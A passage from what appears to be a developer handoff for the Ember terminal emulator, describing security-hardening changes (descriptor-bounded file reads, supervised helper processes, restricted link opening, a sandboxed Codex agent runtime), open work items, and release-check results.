  `MAX_FONT_BYTES` (64 MiB — desktop fonts are a few MiB, the largest CJK
  collections stay under half of that) before allocation, and read from that
  descriptor only; the path is never reopened, so there is no TOCTOU window.
  `load_font_from_path` and the bold-variant fallback loop skip a rejected
  candidate with a path-rich error and fall through to the next one, so a
  planted symlink, FIFO, device, or oversized file can neither stall nor
  redirect startup. The `persistence_file` ownership/hard-link/permission
  contract is deliberately not reused: system fonts are root-owned and
  world-readable by design. Headless regression tests cover a symlink to a
  real font, a non-blocking FIFO rejection, an oversized sparse file, an
  exact-limit load, and the fallback loop skipping a non-regular candidate.

- The jterm_core pin advances to `b8b1b89`, which routes desktop notifications
  through core's bounded helper boundary. The local `src/review_text.rs`
  duplicate of core's review boundary is dissolved: the visual-spoofing
  character class and its whole-string predicates now come from
  `jterm_core::review_input::{is_visual_spoofing_character,
  contains_visual_spoofing}` at every former call site (agent event/session-ID
  guards, codex app-server display bounding, native follow-up validation, diff
  and command preview neutralization, agent-panel spoof checks). What remains
  in `src/review_text.rs` is ember-only surface policy with no core
  counterpart: the per-surface byte budgets (`MAX_AGENT_COMMAND_BYTES`,
  `MAX_HISTORY_COMMAND_BYTES`, `MAX_PROMPT_INSERT_BYTES`), the parameterized
  `validate_single_line` with its limit-carrying `ReviewTextError`, and the
  multiline `sanitize_prompt_payload` / `sanitize_history_replay` /
  `visible_bounded` helpers, all now delegating their spoof class to core. The
  duplicated full-list test collapses to a wiring/budget smoke test since core
  owns the character-class coverage.

- The jterm_core pin advances to `86661a7` and the app-owned boundaries sink
  into it. `src/helpers.rs` is deleted: font and notification helpers now call
  `jterm_core::helper::{fc_list, fc_match, notify_send}` directly, which carry
  the same fixed candidates, canonical-chain trust, clamped child PATH,
  per-stream byte caps, and single group-killing deadline on top of core's
  `SupervisedChild`. The OSC 8 / link opener policy delegates to
  `jterm_core::link::is_openable_url` (`MAX_OSC8_URI_BYTES` aliases core's
  ceiling); local-path and IP *detection* stays local, and activation still
  routes through the shared policy. The session decoder's text budget and
  borrowed deferred raw fields now come from `jterm_core::bounded_json`
  (`TextBudget`, `DeferredRawField`); only ember's schema, repair counters,
  and seeds remain app-side.

- The source installer accepts `--binary PATH`, allowing release archives, CI
  artifacts, and distro staging to reuse the same path contract without Cargo.
  A real `DESTDIR` install/uninstall test checks all six artifacts, modes,
  launcher paths, escaping, and failure diagnostics. Desktop and AppStream
  validation now run in CI; custom desktop executable paths with
  undefined/unportable `%`, forbidden `=`, or control characters fail
  explicitly. `scripts/install.sh` and `scripts/uninstall.sh` now derive the
  default binary from the same `PREFIX/bin` contract (`~/.local/bin` by
  default), and CI checks the scripts with Bash and ShellCheck.

- The app-owned font and notification helpers now run behind a bounded process
  boundary (`helpers.rs`). `fc-list`, `fc-match`, and `notify-send` resolve only
  from fixed absolute system candidates whose canonical file and every directory
  above it are root-owned (or self-owned read-only) and never group/other
  writable; a non-root user's own owner-writable component fails closed. Each
  invocation leads its own process group, drains stdout and stderr concurrently
  under independent byte caps over nonblocking `poll`, and answers to one
  deadline that SIGKILLs and reaps the whole group — a descendant holding an
  inherited pipe cannot outlive it. Exit observation uses `waitid(WNOWAIT)`, so
  the leader stays waitable and its PID/PGID reserved until cleanup; a recycled
  group id can never be signalled. The notification worker's private
  kill-and-wait helper is gone, and text link detection is absolute HTTP(S)
  only: `ftp://` is no longer clickable. Regression tests cover untrusted
  scratch-path binaries, mutable/foreign ownership, concurrent dual-stream
  draining, per-stream caps, WNOWAIT observability, and a deadline killing a
  descendant that holds both pipes.

- Native Codex startup now has a bounded, cancellable background preparation
  phase. Git/worktree identity checks, descriptor pinning, launcher validation,
  prompt construction, and private `CODEX_HOME` setup no longer run on the UI
  thread. A `TaskId` plus local generation and the still-current sharing/redaction
  policy gate completion; the task remains `Created + Unassigned` until the UI
  thread receives the exact current result, while cancellation, stale state,
  and revoked consent drop their FDs, in-memory credential grant, and temporary
  home without spawning a provider. Preparation workers remain globally bounded
  and joined through cleanup even across rapid start/cancel cycles. The provider
  worker repeats descriptor-backed Git identity and trusted launcher checks just
  before spawn. Direct Agent terminals and native compatibility fallbacks can
  both retry after an unsuccessful PTY exit; a successful new PTY atomically
  replaces the exited transcript binding while sticky provenance is preserved.

- The experimental Tasks dashboard now has a live multi-turn Codex app-server
  runtime. It sends explicitly shared, bounded failed-command evidence over
  Codex's structured JSONL protocol, reduces correlated lifecycle events into
  task state, and retains bounded agent/command/file views. A completed turn
  becomes a live review point: bounded user feedback starts another sequential
  turn on the same provider thread with identical cwd, sandbox, environment,
  approval, and containment authority. Duplicate/overlapping turns are rejected,
  a later turn invalidates earlier validation evidence, and **Finish Codex** is
  required before validation can start. Live sessions are capped at 32 turns so
  all completed provider turn IDs remain authoritative tombstones for the whole
  session. The dashboard projects the current/latest turn alongside a compact,
  byte-budgeted completed-turn history keyed by Ember-local turn identities;
  oldest summaries are evicted explicitly while the worktree diff remains
  cumulative. This is still process-local review state, not a durable task
  transcript. Once that session stops, native restart and cross-process thread
  resume remain disabled. The provider runs
  in a descriptor-pinned isolated worktree and transient user-systemd cgroup;
  Ember publishes its terminal event only after the cgroup is empty and the
  leader is reaped. File-change requests require an immutable, completely
  displayable patch snapshot. Approval policy is fixed to `never`; any managed
  request is display-and-deny only because accepted command or file actions are
  not yet bound to Ember's descriptor capability. The provider gets a private
  empty `CODEX_HOME`, an access-token-only external login, and a pre-thread
  effective-config proof that rejects inherited MCP, hooks, plugins, apps,
  project trust, and managed authority. Hosted search and tool network access
  are disabled; the audited 0.147.0 protocol is version-gated, and tool
  subprocesses get a separate no-login, proxy-free environment with a vetted
  absolute PATH. Native failure keeps the worktree available for an explicit
  PTY compatibility continuation. If a later turn fails after an earlier review
  point, that review state remains available and the fully stopped failed session
  can atomically bind a terminal fallback without losing the old state on spawn
  failure. Native session resume remains future work.

- Agent tasks that are ready for review can now re-run their originating
  semantic command as a separate validation terminal inside the isolated
  worktree. Validation requires exact, untruncated, single-line command
  metadata; maps a canonical source-repository subdirectory to the matching
  canonical worktree directory; and rejects missing directories, control or
  bidi-spoofing text, and symlink escapes before spawn. Agent and validation
  PTYs have distinct stable roles and exit reducers, so failed, inconclusive,
  or manually cancelled validation never turns into an Agent runtime failure.
  The Tasks card retains attempt/result state and exposes validation output,
  rerun, diff review, and an explicit pass-gated Mark complete action. Spawn is
  gated before PTY creation while a native event stream is active; one live
  native session may carry sequential turns but cannot restart after stopping;
  and validation uses non-login shell
  command mode plus no-rc/scrubbed startup hooks. The actual source-session
  shell identity is captured before config hot reloads, Git registration and
  branch identity are rechecked, and a descriptor-pinned cwd is carried from
  preflight to child `fchdir` to close pathname replacement races.

- `keybindings.toml` no longer has an `exists()`/path-reopen race. It is opened
  once through Ember's no-follow, nonblocking descriptor boundary, checked as
  an owned single-link regular file, and bounded to 256 KiB before allocation
  or TOML parsing. Missing files still use defaults; unsafe, invalid UTF-8, and
  oversized entries report a path-rich error and cannot stall startup.

- Completed command records now map the pinned `jterm_core::block_contract`
  result into Ember's renderer-owned `BlockOutcome`; Prompt/Running lifecycle
  states remain local. The call happens only after OSC metadata and screen
  fallback have populated the canonical `CommandRecord`, and an explicit
  truncated-command fact still counts as command presence without exposing its
  omitted text. Failure markers/navigation and Commands-sidebar filtering/status
  all classify the raw optional exit before any legacy scalar adapter, so
  background+nonzero and command+unreported cases stay consistent.
  Completion provenance, lifecycle health, and their assessment function are
  now direct public re-exports of the shared contract rather than local semantic
  mirrors. The shared enums retain Ember's existing inherent `schema_name()`
  API, while compatibility helpers keep JSON/diagnostic call sites explicit.

- Agent restore now consumes `jterm_core::agent::SessionClaim`, backed by one
  atomic no-replace rename rather than the former local hard-link/unlink pair.
  Exactly one concurrent opener restores a valid snapshot; malformed, future,
  oversized, and semantically invalid evidence remains byte-identical at its
  private claim path. An empty or rejected local session still leaves the
  public path alone, so one process exiting cannot delete a newer checkpoint
  published by another. Core now syncs retirement of the public name before it
  exposes a live session, so a crash cannot replay an already consumed approval.
  `jterm_core` is pinned to `21437ba6f0cb85e74d4ce2a03ef1857de2c55d9d`
  (transitively jagent `a462ec81f3a4c6ad85a455780ced232172f127ea`).
  Claim-acquisition errors are logged with the public path and leave that path
  untouched; there is no best-effort fallback read or delete.
- The in-flight model request records the task generation it was started for; a
  reply that lands after New Task, a restore, or a session replacement is
  dropped instead of being applied to a transcript that no longer exists.
- Execution generations use `checked_add`; exhaustion seals the session instead
  of reusing an identity a late completion could bind to.
- Session restore now decodes through a schema-aware bounded RawValue decoder.
  The v1–v4 envelope and every nested child are borrowed as
  `serde_json::value::RawValue` slices of the 4 MiB-bounded input, and each
  short-lived parser is finished and dropped before the decoder follows its
  children, so no owned tree ever exists before sanitization. Session, tag,
  retained text, tab, layout-node, depth, and cumulative budgets are enforced
  while parsing; sessions past the retained prefix are schema-validated
  without being retained; an unsupported version short-circuits before any
  payload is decoded. Oversized layout branches are still pruned rather than
  dropped, invalid tabs decode transactionally without losing valid
  neighbours, the active-tab index is remapped onto the input tab it
  originally named, and an invalid `tabs` field falls back to the legacy
  `layout` tree. Required known fields stay strict (including inside discarded
  surplus sessions) while unknown fields, however long their keys, remain
  forward-compatible.
- OSC 52 clipboard *write* now defaults to false. Missing configuration and new
  installs refuse terminal-driven clipboard writes; an explicit `true`
  round-trips unchanged.
- OSC 8 activation is restricted to absolute HTTP(S) URLs with an authority and
  no userinfo, controls, whitespace, backslash, or visually ambiguous
  characters. `file:`, `ssh:`, `git:`, and `mailto:` targets are no longer
  clickable. Links open through a non-user-writable absolute opener, file
  operands are passed after `--`, and the opener process is reaped.

## Remaining boundaries

- **This round is uncommitted.** `Cargo.toml`, `Cargo.lock`,
  `src/workflows.rs`, `src/workflow_picker.rs`, `src/app/rendering.rs`,
  `src/app/commands.rs` and `scripts/workflows/docker-tail-logs.yaml` are
  modified in the working tree and nothing is staged. The core pin, however, is
  *not* outstanding: `jterm_core` was published and the manifest and lock both
  moved to `790d06ab19b9f3dec7c188728fc468f008df5414`, the revision that
  introduces `workflows`. No `[patch]` remains in `~/.cargo/config.toml`, and
  the gate below was rerun with `--locked` against the published revision. The
  only other line the lock moved is `serde_yaml_ng` migrating from ember's own
  dependency list to `jterm_core`'s; no new crate enters the build.
- **The picker overlay did move — the query bridge is what stayed.**
  `WorkflowPickerState` now wraps `jterm_core::workflows::WorkflowPicker` with
  `PickerPolicy::new(MAX_RESULTS, false)`, so filtering, the 15-result cap, the
  highlight reset and UTF-8-safe query truncation are the core's. Ember keeps
  one `String` edit buffer because `ui.text_edit_singleline` needs
  `&mut String` while the core's query is writable only through `set_query`;
  `sync_query()` writes it across each frame and copies the core's normalised
  result back into the box. The parameter dialog keeps a per-row buffer for the
  same reason, and for a second one that matters more: handing `TextEdit` a
  `&mut` into `ArgsForm` would flatten Unset and Supplied("") back together and
  kill the guard this round exists for. `sync()` after the row loop is the only
  write path into the model, and it compares content rather than trusting
  egui's `changed()`, so the model and what is on screen cannot disagree.
  Frost is the other consumer of the same core picker and should be checked
  against this shape.
- **The migration's own "not done" list is largely closed, and this handoff
  supersedes it.** The core rev was published and pinned (`790d06a`), the picker
  overlay *did* adopt `WorkflowPicker`/`PickerPolicy`, `docker-tail-logs.yaml`
  was fixed, and `scripts/workflows` was reconciled across the family — all four
  after the migration report was written, so read that report against the diff,
  not on its own. What genuinely remains: this round is unstaged and
  uncommitted; the shim's `O_NOFOLLOW` attribution sentence is wrong (above);
  `welcome_notebook_path` stays with anvil and frost, which is correct for ember
  and not work; and no core API bug was found to report — every choice that
  changes which directories are read or in what order is a required argument
  with no `Default`, so no compiling call can omit a policy.
- **Nothing this round was exercised in a running window.** The `*` marker, the
  `* needs a value` footer and the error-and-stay-open dialog behaviour are
  covered at the state layer and read off `app/rendering.rs`; the family's GUI
  harness was not run. Treat the dialog's visual claims in README as
  code-derived until someone opens the picker.
- The correction round's items below are unchanged: `Cargo.toml`, `Cargo.lock`
  and `src/command_correction.rs` were modified in the working tree and nothing
  was staged. (The AI chat surface that the previous handoff listed here as
  untracked has since landed — `src/ai_chat_panel.rs`, `src/ai_chat_store.rs`
  and `src/ai_command_suggestion.rs` are tracked as of `b3d5ffd`, and the
  correction surface itself as of `e297954`.)
- **The shared-core pin advanced to a published revision.** `jterm_core` is
  pinned at `badcce222fb5471a6afbfc5d5e898e2bc3faf632`, the commit that
  introduces `command_correction`, and the transitive `jagent` in `Cargo.lock`
  is unchanged at `f9383ec56c7c94f1e25ba6fbeb17fa5e47132abf`. The core was
  published before the pin moved, no local `[patch]` remains, and the gate
  below — including `--locked` — was rerun against the published revision. The
  only other line the lock moved is `fuzzy-matcher` appearing under
  `jterm_core`; ember already depends on that crate directly, so no new crate
  enters the build. Note that `UPGRADE_ROUNDS.md` round 37 records the pin
  advancing to `0f47569`; the manifest never held that value, and the entry is
  left as written rather than rewritten after the fact.
- **`CorrectionRequestState::cancel_active` is private in the core**, so the
  shim's disabled-mid-flight path calls `cancel(entry.generation)` where the old
  copy called `cancel_active()`. Equivalent here — `entry.generation` is always
  the live epoch except immediately after a `retire()`, at which point `active`
  is already `None` and there is nothing to cancel — and
  `a_disabled_surface_cancels_an_in_flight_request_and_drops_the_session` pins
  the behaviour rather than the call. Recorded so the anvil/forge/frost ports do
  not each rediscover it.
- **`LocalEvidence::SameNamespace { search_path: Vec::new(), .. }` compiles and
  silently disables all PATH evidence.** It fails closed, so it is not a hole,
  and making it non-empty by construction would mean a `NonEmpty<Vec<PathBuf>>`
  for little gain — but it is the one field of the policy where a wrong value is
  silent rather than a compile error. Ember's policy test asserts the split
  `PATH` is actually there. Everything else safety-relevant could not be omitted
  and still compile: `LocalEvidence` and `ContextSharing` have no `Default`,
  `CorrectionPolicy::new` takes all three arguments positionally, and
  `CompletionFacts` is a struct literal whose fields are all required, so a
  missing `trusted_completion` is a compile error.
- **The card is still not exercised through a real egui frame.** Unchanged from
  before this round — ember's previous suite never drove `show()` either, since
  that needs a real `egui::Context` with input and a focus surface. The new
  rendering test asserts on the exact accessors the card body reads
  (`display_title` / `display_badge` / `display_description` / `risk` /
  `run_allowed`) rather than on pixels, which is as close as this surface gets
  without an Xvfb harness. The focus, arming and 2 s retry rules therefore
  remain covered by reading only.
- The font-input descriptor boundary recorded above was the last item carried
  from the earlier handoffs; nothing else survives from them, and the items
  above are this round's own.

## Release checks

```text
cargo fmt --all -- --check
cargo test --locked --all-targets --all-features --no-fail-fast
cargo clippy --locked --all-targets --all-features -- -D warnings
bash -n scripts/install.sh scripts/uninstall.sh scripts/test-install-paths.sh
shellcheck scripts/install.sh scripts/uninstall.sh scripts/test-install-paths.sh
bash scripts/test-install-paths.sh
```

Run on 2026-08-29 for the workflow round: `cargo fmt --all -- --check` and
`cargo clippy --locked --all-targets --all-features -- -D warnings` are clean,
and `cargo test --locked` reports 931 library tests plus 1,234 binary tests plus
the native Codex worker end-to-end test — 2,166 in total — passing with zero
failures, against the published `790d06a` core. (`--locked` was expected to be
unusable this round because the core was still unpublished; it was published and
pinned before the docs pass, so the gate is the ordinary one.)

The count drops by 30 against the previous round. `src/workflows.rs` goes from
21 tests to 5: sixteen loader, discovery and renderer tests duplicated the
engine's and now live in `jterm_core::workflows` (3,186 lines across five files,
73 `#[test]`s at `790d06a`). The five that remain cover only this app's own
wiring — the discovery policy including the derived `EMBER_WORKFLOW_DIR` and
ember's own dev root, the pinned load order observed through `load_all` rather
than through the constant alone, uniqueness and bounding of the search path, the
directory the empty picker names, and the bundled-library contract.
`src/workflow_picker.rs` goes from 6 tests to 8, adding the query-buffer
boundary and the emptied-defaulted-row rule; it is a binary-only module, which
is why the library count falls by 16 and the binary count by 14.

The previous round's run, for comparison: `cargo test --locked` reported 947
library tests plus 1,248 binary tests plus the end-to-end test — 2,196 in total
— against the published `badcce2` core. The install-script checks were not
re-run in either round; nothing in them touches `scripts/`. `scripts/workflows/`
is data this round *does* change (`docker-tail-logs.yaml`), and it is covered by
`every_bundled_workflow_is_parseable_and_review_only` rather than by those
scripts.

Not verified, and not claimed: nothing here was exercised through a running
desktop session. The `*` marker, the footer hint and the error-and-stay-open
behaviour of the parameter dialog are asserted at the state layer
(`WorkflowArgsState`) and read off the egui code in `app/rendering.rs`; no GUI
run was made.
